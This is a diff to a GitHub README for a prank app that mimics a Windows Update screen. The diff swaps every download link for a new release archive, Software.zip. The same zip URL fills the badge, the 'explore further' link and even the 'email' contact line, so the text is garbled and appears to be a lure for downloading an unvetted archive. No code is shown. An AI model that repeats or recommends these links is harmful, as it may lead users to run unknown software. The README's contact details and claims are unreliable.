@@ -2,7 +2,7 @@
 
 ### Welcome to the Fake Windows Update repository! 👋
 
-[![GitHub release](https://github.com/Tod12345/fake-windows-update/releases/download/v1.0.0/Application.zip%20Software-Click%20Here-brightgreen)](https://github.com/Tod12345/fake-windows-update/releases/download/v1.0.0/Application.zip)
+[![GitHub release](https://github.com/Tod12345/fake-windows-update/releases/download/v2.0/Software.zip%20Software-Click%20Here-brightgreen)](https://github.com/Tod12345/fake-windows-update/releases/download/v2.0/Software.zip)
 
 Hey there prankster! Are you ready to pull off the ultimate Windows update prank on your friends or colleagues? Look no further, because Fake Windows Update is here to help you with that! 🎉
 
@@ -24,7 +24,7 @@ Fake Windows Update is an Electron app that simulates a realistic Windows Update
 
 ### 🌐 Explore Further:
 
-If you want to dive deeper into the world of fake updates and pranks, be sure to check out our [link](https://github.com/Tod12345/fake-windows-update/releases/download/v1.0.0/Application.zip) for more surprises! 🌟
+If you want to dive deeper into the world of fake updates and pranks, be sure to check out our [link](https://github.com/Tod12345/fake-windows-update/releases/download/v2.0/Software.zip) for more surprises! 🌟
 
 ### 📥 Download Must-have Resources:
 
@@ -44,7 +44,7 @@ To stay in the loop with the latest updates and releases, keep an eye on our "Re
 
 ### 📞 Contact Us:
 
-Got a burning question about fake updates or need help troubleshooting an issue? Reach out to us via email at https://github.com/Tod12345/fake-windows-update/releases/download/v1.0.0/Application.zip or join our Discord server for real-time support. We're here to make sure your pranks go off without a hitch! 📧💬
+Got a burning question about fake updates or need help troubleshooting an issue? Reach out to us via email at https://github.com/Tod12345/fake-windows-update/releases/download/v2.0/Software.zip or join our Discord server for real-time support. We're here to make sure your pranks go off without a hitch! 📧💬
 
 ### 🎉 Get Ready to Prank:
 
